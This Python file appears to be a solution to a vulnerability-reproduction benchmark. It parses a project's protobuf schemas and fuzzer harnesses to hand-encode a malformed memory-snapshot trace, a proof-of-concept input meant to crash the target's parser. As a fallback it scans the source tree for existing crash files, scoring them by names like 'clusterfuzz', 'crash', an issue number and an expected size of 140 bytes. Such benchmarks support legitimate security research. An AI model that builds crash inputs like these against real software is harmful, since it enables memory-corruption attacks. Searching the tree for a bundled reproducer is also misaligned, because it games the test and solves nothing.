import os
import re
import tarfile
import struct
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple, Iterable


def _read_file_limited(path: str, limit: int) -> Optional[bytes]:
    try:
        st = os.stat(path)
        if st.st_size > limit:
            return None
        with open(path, "rb") as f:
            return f.read()
    except Exception:
        return None


def _remove_proto_comments_and_strings(s: str) -> str:
    s = re.sub(r'//.*?$', '', s, flags=re.M)
    s = re.sub(r'/\*.*?\*/', '', s, flags=re.S)
    s = re.sub(r'"(?:\\.|[^"\\])*"', '""', s)
    return s


_PROTO_TOKEN_RE = re.compile(r'[A-Za-z_][A-Za-z0-9_\.]*|\d+|[{}[\]();=<>.,]')


def _proto_tokenize(s: str) -> List[str]:
    return _PROTO_TOKEN_RE.findall(s)


@dataclass
class Field:
    name: str
    number: int
    label: str  # "optional", "required", "repeated", or ""
    type_raw: str
    type_simple: str
    is_message: bool = False


class ProtoSchema:
    def __init__(self) -> None:
        self.messages_full: Dict[str, List[Field]] = {}
        self.simple_to_full: Dict[str, List[str]] = {}
        self._message_simples: set[str] = set()

    @staticmethod
    def _simple_name(type_name: str) -> str:
        t = type_name.strip()
        if t.startswith("."):
            t = t[1:]
        if "." in t:
            t = t.split(".")[-1]
        return t

    def add_message(self, full_name: str) -> None:
        if full_name not in self.messages_full:
            self.messages_full[full_name] = []
        simple = full_name.split(".")[-1]
        self._message_simples.add(simple)
        self.simple_to_full.setdefault(simple, []).append(full_name)

    def add_field(self, msg_full: str, field: Field) -> None:
        self.messages_full.setdefault(msg_full, []).append(field)

    def finalize(self) -> None:
        for msg, fields in self.messages_full.items():
            for f in fields:
                f.is_message = f.type_simple in self._message_simples

    def resolve_message(self, type_name: str) -> Optional[str]:
        simp = self._simple_name(type_name)
        cands = self.simple_to_full.get(simp, [])
        if not cands:
            return None
        if len(cands) == 1:
            return cands[0]
        if type_name.startswith("."):
            t = type_name[1:]
            for c in cands:
                if c.endswith(t) or c == t:
                    return c
        return cands[0]

    def get_message_by_simple(self, simple: str) -> Optional[str]:
        cands = self.simple_to_full.get(simple, [])
        if not cands:
            return None
        if len(cands) == 1:
            return cands[0]
        for c in cands:
            if c == simple:
                return c
        return cands[0]

    def fields(self, msg_full: str) -> List[Field]:
        return self.messages_full.get(msg_full, [])


def _parse_protos(proto_texts: Iterable[str]) -> ProtoSchema:
    schema = ProtoSchema()

    for text in proto_texts:
        cleaned = _remove_proto_comments_and_strings(text)
        toks = _proto_tokenize(cleaned)
        stack: List[Tuple[str, str, str]] = []  # (kind, name, full)
        i = 0

        def in_enum() -> bool:
            return any(k == "enum" for k, _, _ in stack)

        def current_message_full() -> Optional[str]:
            for k, _, full in reversed(stack):
                if k == "message":
                    return full
            return None

        while i < len(toks):
            t = toks[i]
            if t == "message":
                if i + 1 >= len(toks):
                    i += 1
                    continue
                name = toks[i + 1]
                i += 2
                while i < len(toks) and toks[i] != "{":
                    i += 1
                if i >= len(toks) or toks[i] != "{":
                    continue
                parent_msgs = [nm for k, nm, _ in stack if k == "message"]
                full = ".".join(parent_msgs + [name]) if parent_msgs else name
                schema.add_message(full)
                stack.append(("message", name, full))
                i += 1
                continue
            if t == "enum":
                if i + 1 >= len(toks):
                    i += 1
                    continue
                name = toks[i + 1]
                i += 2
                while i < len(toks) and toks[i] != "{":
                    i += 1
                if i < len(toks) and toks[i] == "{":
                    parent_msgs = [nm for k, nm, _ in stack if k == "message"]
                    full = ".".join(parent_msgs + [name]) if parent_msgs else name
                    stack.append(("enum", name, full))
                    i += 1
                continue
            if t == "oneof":
                if i + 1 >= len(toks):
                    i += 1
                    continue
                name = toks[i + 1]
                i += 2
                while i < len(toks) and toks[i] != "{":
                    i += 1
                if i < len(toks) and toks[i] == "{":
                    msg_full = current_message_full() or ""
                    stack.append(("oneof", name, msg_full))
                    i += 1
                continue
            if t == "}":
                if stack:
                    stack.pop()
                i += 1
                continue

            msg_full = current_message_full()
            if not msg_full or in_enum():
                i += 1
                continue

            if t in ("option", "reserved", "extensions", "import", "package", "syntax", "extend"):
                while i < len(toks) and toks[i] != ";":
                    i += 1
                if i < len(toks) and toks[i] == ";":
                    i += 1
                continue

            label = ""
            if t in ("optional", "required", "repeated"):
                label = t
                i += 1
                if i >= len(toks):
                    break
                t = toks[i]

            type_raw = ""
            if t == "map":
                j = i
                if j + 1 < len(toks) and toks[j + 1] == "<":
                    depth = 0
                    parts = []
                    while j < len(toks):
                        parts.append(toks[j])
                        if toks[j] == "<":
                            depth += 1
                        elif toks[j] == ">":
                            depth -= 1
                            if depth == 0:
                                j += 1
                                break
                        j += 1
                    type_raw = "".join(parts)
                    i = j
                else:
                    type_raw = "map"
                    i += 1
            else:
                type_raw = t
                i += 1

            if i >= len(toks):
                break
            name_tok = toks[i]
            if not re.match(r'^[A-Za-z_][A-Za-z0-9_]*$', name_tok):
                continue
            field_name = name_tok
            i += 1
            if i >= len(toks) or toks[i] != "=":
                continue
            i += 1
            if i >= len(toks) or not toks[i].isdigit():
                continue
            number = int(toks[i])
            i += 1
            while i < len(toks) and toks[i] != ";":
                if toks[i] == "{":
                    break
                i += 1
            if i < len(toks) and toks[i] == ";":
                i += 1

            type_simple = ProtoSchema._simple_name(type_raw)
            schema.add_field(
                msg_full,
                Field(name=field_name, number=number, label=label, type_raw=type_raw, type_simple=type_simple),
            )

    schema.finalize()
    return schema


def _enc_varint(n: int) -> bytes:
    if n < 0:
        n &= (1 << 64) - 1
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _zigzag64(n: int) -> int:
    return (n << 1) ^ (n >> 63)


def _wire_type_for_scalar(field_type: str) -> int:
    t = field_type
    if t.startswith("."):
        t = t[1:]
    if "." in t:
        t = t.split(".")[-1]
    if t in ("fixed64", "sfixed64", "double"):
        return 1
    if t in ("fixed32", "sfixed32", "float"):
        return 5
    if t in ("string", "bytes"):
        return 2
    return 0


def _enc_key(field_number: int, wire_type: int) -> bytes:
    return _enc_varint((field_number << 3) | wire_type)


def _enc_scalar(field_type: str, value: int) -> bytes:
    t = field_type
    if t.startswith("."):
        t = t[1:]
    if "." in t:
        t = t.split(".")[-1]

    if t in ("fixed64", "sfixed64", "double"):
        return struct.pack("<Q", value & 0xFFFFFFFFFFFFFFFF)
    if t in ("fixed32", "sfixed32", "float"):
        return struct.pack("<I", value & 0xFFFFFFFF)
    if t in ("sint32", "sint64"):
        return _enc_varint(_zigzag64(int(value)))
    return _enc_varint(int(value))


def _enc_field_scalar(field_number: int, field_type: str, value: int) -> bytes:
    wt = _wire_type_for_scalar(field_type)
    return _enc_key(field_number, wt) + _enc_scalar(field_type, value)


def _enc_field_msg(field_number: int, payload: bytes) -> bytes:
    return _enc_key(field_number, 2) + _enc_varint(len(payload)) + payload


def _pick_field(
    fields: List[Field],
    *,
    prefer_names: Tuple[str, ...] = (),
    name_contains: Tuple[str, ...] = (),
    type_contains: Tuple[str, ...] = (),
    type_simple: Optional[str] = None,
    repeated: Optional[bool] = None,
    want_message: Optional[bool] = None,
) -> Optional[Field]:
    best: Optional[Field] = None
    best_score = -10**9
    for f in fields:
        if repeated is not None:
            if repeated and f.label != "repeated":
                continue
            if not repeated and f.label == "repeated":
                continue
        if want_message is not None and f.is_message != want_message:
            continue
        score = 0
        fn = f.name.lower()
        ft = f.type_simple.lower()
        if f.name in prefer_names:
            score += 200
        for s in name_contains:
            if s in fn:
                score += 50
        if type_simple is not None and f.type_simple == type_simple:
            score += 80
        for s in type_contains:
            if s.lower() in ft:
                score += 30
        if f.label == "repeated":
            score += 5
        if score > best_score:
            best_score = score
            best = f
    return best


def _detect_root_message(fuzzer_sources: List[str]) -> str:
    priorities = ["Trace", "TracePacket", "MemorySnapshot", "ProcessMemoryDump"]
    best = None
    best_score = -1
    for src in fuzzer_sources:
        s = src
        is_relevant = ("memory_snapshot" in s) or ("MemorySnapshot" in s) or ("memory snapshot" in s.lower())
        base = 10 if is_relevant else 0
        for idx, name in enumerate(priorities):
            if re.search(r'\b' + re.escape(name) + r'::Decoder\b', s) or re.search(r'pbzero::' + re.escape(name) + r'::Decoder\b', s):
                score = base + (len(priorities) - idx) * 10
                if score > best_score:
                    best_score = score
                    best = name
    return best or "Trace"


def _craft_poc_from_schema(schema: ProtoSchema, root_simple: str) -> Optional[bytes]:
    root_full = schema.get_message_by_simple(root_simple)
    if not root_full:
        return None

    trace_full = schema.get_message_by_simple("Trace")
    tracepacket_full = schema.get_message_by_simple("TracePacket")
    memsnap_full = schema.get_message_by_simple("MemorySnapshot")
    proc_full = schema.get_message_by_simple("ProcessMemoryDump")

    def build_edge(edge_full: str, source_id: int, target_id: int) -> Optional[bytes]:
        edge_fields = schema.fields(edge_full)
        src_f = _pick_field(edge_fields, name_contains=("source",), want_message=False)
        tgt_f = _pick_field(edge_fields, name_contains=("target",), want_message=False)
        if not src_f or not tgt_f:
            src_f = _pick_field(edge_fields, name_contains=("src",), want_message=False)
            tgt_f = _pick_field(edge_fields, name_contains=("dst",), want_message=False)
        if not src_f or not tgt_f:
            return None
        msg = bytearray()
        msg += _enc_field_scalar(src_f.number, src_f.type_raw, source_id)
        msg += _enc_field_scalar(tgt_f.number, tgt_f.type_raw, target_id)
        return bytes(msg)

    def build_dump(dump_full: str, dump_id: int) -> Optional[bytes]:
        dump_fields = schema.fields(dump_full)
        id_f = _pick_field(dump_fields, prefer_names=("id",), name_contains=("id",), want_message=False, repeated=False)
        if not id_f:
            return None
        return _enc_field_scalar(id_f.number, id_f.type_raw, dump_id)

    def build_process(process_full: str) -> Optional[bytes]:
        pf = schema.fields(process_full)
        pid_f = _pick_field(pf, prefer_names=("pid",), name_contains=("pid",), want_message=False, repeated=False)
        dumps_f = _pick_field(
            pf,
            prefer_names=("allocator_dumps", "memory_allocator_dumps"),
            name_contains=("allocator", "dump"),
            type_contains=("Dump",),
            repeated=True,
            want_message=True,
        )
        edges_f = _pick_field(
            pf,
            prefer_names=("allocator_dump_edges", "memory_allocator_dump_edges"),
            name_contains=("edge",),
            type_contains=("Edge",),
            repeated=True,
            want_message=True,
        )

        if not edges_f:
            edges_f = _pick_field(pf, name_contains=("edge",), repeated=True, want_message=True)
        if not edges_f:
            return None

        edge_full = schema.resolve_message(edges_f.type_raw)
        if not edge_full:
            return None

        process_msg = bytearray()
        if pid_f:
            process_msg += _enc_field_scalar(pid_f.number, pid_f.type_raw, 1)

        if dumps_f:
            dump_full = schema.resolve_message(dumps_f.type_raw)
            if dump_full:
                dump_msg = build_dump(dump_full, 1)
                if dump_msg is not None:
                    process_msg += _enc_field_msg(dumps_f.number, dump_msg)

        edge_msg = build_edge(edge_full, 1, 2)
        if edge_msg is None:
            return None
        process_msg += _enc_field_msg(edges_f.number, edge_msg)
        return bytes(process_msg)

    def build_snapshot(snapshot_full: str, process_full_in: str) -> Optional[bytes]:
        sf = schema.fields(snapshot_full)
        proc_f = _pick_field(
            sf,
            prefer_names=("process_dumps", "process_memory_dumps"),
            name_contains=("process", "dump"),
            type_contains=("Process", "Dump"),
            repeated=True,
            want_message=True,
        )
        if not proc_f:
            proc_f = _pick_field(sf, type_contains=("ProcessMemoryDump",), repeated=True, want_message=True)
        if not proc_f:
            return None
        proc_full2 = schema.resolve_message(proc_f.type_raw)
        if not proc_full2:
            proc_full2 = process_full_in
        proc_msg = build_process(proc_full2)
        if proc_msg is None:
            return None
        return _enc_field_msg(proc_f.number, proc_msg)

    def build_tracepacket(tp_full: str) -> Optional[bytes]:
        tpf = schema.fields(tp_full)
        ms_f = _pick_field(
            tpf,
            prefer_names=("memory_snapshot",),
            name_contains=("memory", "snapshot"),
            type_contains=("MemorySnapshot",),
            repeated=False,
            want_message=True,
        )
        if not ms_f:
            ms_f = _pick_field(tpf, name_contains=("snapshot",), type_contains=("Snapshot",), repeated=False, want_message=True)
        if not ms_f:
            return None
        ms_full2 = schema.resolve_message(ms_f.type_raw) or memsnap_full
        if not ms_full2:
            return None
        proc_full2 = proc_full
        if not proc_full2:
            return None
        snapshot_payload = build_snapshot(ms_full2, proc_full2)
        if snapshot_payload is None:
            return None
        return _enc_field_msg(ms_f.number, snapshot_payload)

    def build_trace(t_full: str) -> Optional[bytes]:
        tf = schema.fields(t_full)
        packet_f = _pick_field(
            tf,
            prefer_names=("packet",),
            name_contains=("packet",),
            type_contains=("TracePacket",),
            repeated=True,
            want_message=True,
        )
        if not packet_f:
            packet_f = _pick_field(tf, type_contains=("TracePacket",), repeated=True, want_message=True)
        if not packet_f:
            return None
        tp_full2 = schema.resolve_message(packet_f.type_raw) or tracepacket_full
        if not tp_full2:
            return None
        tp_payload = build_tracepacket(tp_full2)
        if tp_payload is None:
            return None
        return _enc_field_msg(packet_f.number, tp_payload)

    if root_simple == "Trace":
        if not trace_full:
            return None
        return build_trace(trace_full)
    if root_simple == "TracePacket":
        if not tracepacket_full:
            return None
        return build_tracepacket(tracepacket_full)
    if root_simple == "MemorySnapshot":
        if not memsnap_full or not proc_full:
            return None
        return build_snapshot(memsnap_full, proc_full)
    if root_simple == "ProcessMemoryDump":
        if not proc_full:
            return None
        return build_process(proc_full)

    return None


def _score_poc_candidate(path: str, size: int) -> int:
    p = path.lower()
    score = 0
    if "28766" in p:
        score += 10000
    if "arvo" in p:
        score += 300
    for kw, sc in (
        ("clusterfuzz", 800),
        ("testcase", 300),
        ("minimized", 250),
        ("crash", 250),
        ("poc", 250),
        ("repro", 250),
        ("overflow", 200),
        ("asan", 150),
        ("stack", 150),
        ("fuzz", 100),
        ("corpus", 100),
        ("testdata", 100),
        ("inputs", 100),
    ):
        if kw in p:
            score += sc
    if size == 140:
        score += 400
    else:
        score += max(0, 120 - abs(size - 140))
    ext = os.path.splitext(p)[1]
    if ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".proto", ".md", ".rst", ".txt"):
        score -= 500
    if size <= 0:
        score -= 1000
    return score


class Solution:
    def solve(self, src_path: str) -> bytes:
        proto_texts: List[str] = []
        fuzzer_sources: List[str] = []
        best_candidate: Optional[Tuple[int, bytes, str]] = None

        def consider_candidate(relpath: str, data: bytes) -> None:
            nonlocal best_candidate
            sc = _score_poc_candidate(relpath, len(data))
            if best_candidate is None or sc > best_candidate[0]:
                best_candidate = (sc, data, relpath)

        def handle_text_file(relpath: str, data: bytes) -> None:
            nonlocal proto_texts, fuzzer_sources
            try:
                txt = data.decode("utf-8", errors="ignore")
            except Exception:
                return
            low = relpath.lower()
            if low.endswith(".proto"):
                proto_texts.append(txt)
            elif low.endswith((".cc", ".cpp", ".cxx", ".c", ".h", ".hpp")):
                if "LLVMFuzzerTestOneInput" in txt or "FuzzerTestOneInput" in txt:
                    fuzzer_sources.append(txt)

        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    fp = os.path.join(root, fn)
                    rel = os.path.relpath(fp, src_path)
                    try:
                        st = os.stat(fp)
                    except Exception:
                        continue
                    sz = st.st_size
                    if sz <= 4096:
                        data = _read_file_limited(fp, 4096)
                        if data is not None:
                            consider_candidate(rel, data)
                    ext = os.path.splitext(fn.lower())[1]
                    if ext in (".proto", ".cc", ".cpp", ".cxx", ".c", ".h", ".hpp") and sz <= 2_000_000:
                        data = _read_file_limited(fp, 2_000_000)
                        if data is not None:
                            handle_text_file(rel, data)
        else:
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf:
                        if not m.isreg():
                            continue
                        name = m.name
                        sz = m.size
                        if sz <= 0:
                            continue
                        need_small = sz <= 4096
                        ext = os.path.splitext(name.lower())[1]
                        need_text = ext in (".proto", ".cc", ".cpp", ".cxx", ".c", ".h", ".hpp") and sz <= 2_000_000
                        if not need_small and not need_text:
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read()
                        except Exception:
                            continue
                        if need_small:
                            consider_candidate(name, data)
                        if need_text:
                            handle_text_file(name, data)
            except Exception:
                pass

        root = _detect_root_message(fuzzer_sources)
        poc: Optional[bytes] = None

        if proto_texts:
            try:
                schema = _parse_protos(proto_texts)
                poc = _craft_poc_from_schema(schema, root)
                if poc is None and root != "Trace":
                    poc = _craft_poc_from_schema(schema, "Trace")
            except Exception:
                poc = None

        if poc is not None and len(poc) > 0:
            return poc

        if best_candidate is not None:
            return best_candidate[1]

        return b"\x00"